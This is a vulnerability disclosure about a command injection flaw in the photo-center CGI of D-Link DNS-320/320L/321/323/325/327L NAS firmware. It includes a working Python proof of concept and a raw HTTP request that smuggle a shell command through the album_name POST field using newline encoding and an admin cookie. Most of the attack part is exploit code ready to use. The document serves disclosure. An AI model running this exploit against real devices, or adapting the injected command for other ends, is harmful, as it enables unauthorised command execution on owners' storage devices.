# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L  all firmware version
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_set_cover function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `album_name` is passed from a POST request and is assigned to `v1` via the `sprintf` function at line 21 `` and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723392999395-e044efec-9552-43b1-bc0c-71639bf3ce50.png#averageHue=%23fdfdfa&clientId=u2c4895bb-f0ee-4&from=paste&height=167&id=u33235fba&originHeight=254&originWidth=914&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=44277&status=done&style=none&taskId=u70717cba-202d-4f69-a339-1c0d3cc79d9&title=&width=600.5555419921875)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_set_cover&album_name=%0atouch%09/tmp/666%0a&cover_name=/tmp/111&name=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_set_cover&album_name=%0atouch%09/tmp/666%0a&cover_name=/tmp/111&name=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/
```


